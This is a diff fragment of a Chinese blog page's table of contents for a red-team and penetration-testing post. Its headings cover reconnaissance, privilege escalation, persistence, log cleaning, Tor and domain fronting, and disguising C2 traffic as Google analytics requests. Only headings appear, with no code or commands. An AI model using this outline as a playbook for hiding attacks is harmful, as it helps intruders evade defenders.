+              <span class="site-state-item-count">263</span>
               <span class="site-state-item-name">文章</span>
             </a>
           </div>
@@ -414,7 +561,7 @@
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#大纲"><span class="nav-number">1.</span> <span class="nav-text">大纲</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#预先准备"><span class="nav-number">1.1.</span> <span class="nav-text">预先准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PGP"><span class="nav-number">1.1.1.</span> <span class="nav-text">PGP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#比特币"><span class="nav-number">1.1.2.</span> <span class="nav-text">比特币</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VPS-VPN-C-amp-C"><span class="nav-number">1.1.3.</span> <span class="nav-text">VPS/VPN/C&C</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">1.2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#被动信息收集"><span class="nav-number">1.2.1.</span> <span class="nav-text">被动信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#主动信息收集"><span class="nav-number">1.2.2.</span> <span class="nav-text">主动信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描"><span class="nav-number">1.2.3.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB枚举"><span class="nav-number">1.2.4.</span> <span class="nav-text">SMB枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMTP"><span class="nav-number">1.2.5.</span> <span class="nav-text">SMTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SNMP"><span class="nav-number">1.2.6.</span> <span class="nav-text">SNMP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞扫描-Vulnerability-Scan"><span class="nav-number">1.2.7.</span> <span class="nav-text">漏洞扫描(Vulnerability Scan)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限提升"><span class="nav-number">1.3.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-本地提权"><span class="nav-number">1.3.1.</span> <span class="nav-text">Linux 本地提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-本地提权"><span class="nav-number">1.3.2.</span> <span class="nav-text">Windows 本地提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置错误"><span class="nav-number">1.3.3.</span> <span class="nav-text">配置错误</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后渗透-Post-exploitation"><span class="nav-number">1.4.</span> <span class="nav-text">后渗透 (Post-exploitation)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发"><span class="nav-number">1.4.1.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传-下载"><span class="nav-number">1.4.2.</span> <span class="nav-text">文件上传/下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高价值目标搜索"><span class="nav-number">1.4.3.</span> <span class="nav-text">高价值目标搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限维持-Persistence"><span class="nav-number">1.4.4.</span> <span class="nav-text">权限维持(Persistence)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#日志清理"><span class="nav-number">1.4.5.</span> <span class="nav-text">日志清理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息收集-1"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#蜘蛛，机器人和爬虫-OWASP-IG-001）"><span class="nav-number">2.1.</span> <span class="nav-text">蜘蛛，机器人和爬虫(OWASP-IG-001）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搜索引擎发现-侦查-OWASP-IG-002"><span class="nav-number">2.2.</span> <span class="nav-text">搜索引擎发现/侦查(OWASP-IG-002)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB应用指纹测试-OWASP-IG-004"><span class="nav-number">2.3.</span> <span class="nav-text">WEB应用指纹测试(OWASP-IG-004)</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#大纲"><span class="nav-number">1.</span> <span class="nav-text">大纲</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#预先准备"><span class="nav-number">1.1.</span> <span class="nav-text">预先准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PGP"><span class="nav-number">1.1.1.</span> <span class="nav-text">PGP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#比特币"><span class="nav-number">1.1.2.</span> <span class="nav-text">比特币</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VPS-VPN-C-amp-C"><span class="nav-number">1.1.3.</span> <span class="nav-text">VPS/VPN/C&C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#踪迹隐藏"><span class="nav-number">1.1.4.</span> <span class="nav-text">踪迹隐藏</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">1.2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#被动信息收集"><span class="nav-number">1.2.1.</span> <span class="nav-text">被动信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#主动信息收集"><span class="nav-number">1.2.2.</span> <span class="nav-text">主动信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描"><span class="nav-number">1.2.3.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB枚举"><span class="nav-number">1.2.4.</span> <span class="nav-text">SMB枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMTP"><span class="nav-number">1.2.5.</span> <span class="nav-text">SMTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SNMP"><span class="nav-number">1.2.6.</span> <span class="nav-text">SNMP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞扫描-Vulnerability-Scan"><span class="nav-number">1.2.7.</span> <span class="nav-text">漏洞扫描(Vulnerability Scan)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限提升"><span class="nav-number">1.3.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-本地提权"><span class="nav-number">1.3.1.</span> <span class="nav-text">Linux 本地提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-本地提权"><span class="nav-number">1.3.2.</span> <span class="nav-text">Windows 本地提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置错误"><span class="nav-number">1.3.3.</span> <span class="nav-text">配置错误</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后渗透-Post-exploitation"><span class="nav-number">1.4.</span> <span class="nav-text">后渗透 (Post-exploitation)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发"><span class="nav-number">1.4.1.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传-下载"><span class="nav-number">1.4.2.</span> <span class="nav-text">文件上传/下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高价值目标搜索"><span class="nav-number">1.4.3.</span> <span class="nav-text">高价值目标搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限维持-Persistence"><span class="nav-number">1.4.4.</span> <span class="nav-text">权限维持(Persistence)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#日志清理"><span class="nav-number">1.4.5.</span> <span class="nav-text">日志清理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息收集-1"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#蜘蛛，机器人和爬虫-OWASP-IG-001）"><span class="nav-number">2.1.</span> <span class="nav-text">蜘蛛，机器人和爬虫(OWASP-IG-001）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搜索引擎发现-侦查-OWASP-IG-002"><span class="nav-number">2.2.</span> <span class="nav-text">搜索引擎发现/侦查(OWASP-IG-002)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB应用指纹测试-OWASP-IG-004"><span class="nav-number">2.3.</span> <span class="nav-text">WEB应用指纹测试(OWASP-IG-004)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#backup"><span class="nav-number">3.</span> <span class="nav-text">backup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tor-Fronting"><span class="nav-number">3.1.</span> <span class="nav-text">Tor Fronting</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#make-our-C2-look-like-a-Google-Web-Bug"><span class="nav-number">4.</span> <span class="nav-text">make our C2 look like a Google Web Bug</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#https-developers-google-com-analytics-resources-articles-gaTrackingTroubleshooting"><span class="nav-number">5.</span> <span class="nav-text">https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Author-armitagehacker"><span class="nav-number">6.</span> <span class="nav-text">Author: @armitagehacker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Modified-by-Vincent-Yiu-vysecurity-for-TOR"><span class="nav-number">7.</span> <span class="nav-text">Modified by Vincent Yiu @vysecurity for TOR.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dress-up-the-staging-process-too"><span class="nav-number">8.</span> <span class="nav-text">dress up the staging process too</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Domain-Fronting"><span class="nav-number">8.1.</span> <span class="nav-text">Domain Fronting</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#make-our-C2-look-like-a-Google-Web-Bug-1"><span class="nav-number">9.</span> <span class="nav-text">make our C2 look like a Google Web Bug</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#https-developers-google-com-analytics-resources-articles-gaTrackingTroubleshooting-1"><span class="nav-number">10.</span> <span class="nav-text">https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Author-armitagehacker-1"><span class="nav-number">11.</span> <span class="nav-text">Author: @armitagehacker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dress-up-the-staging-process-too-1"><span class="nav-number">12.</span> <span class="nav-text">dress up the staging process too</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
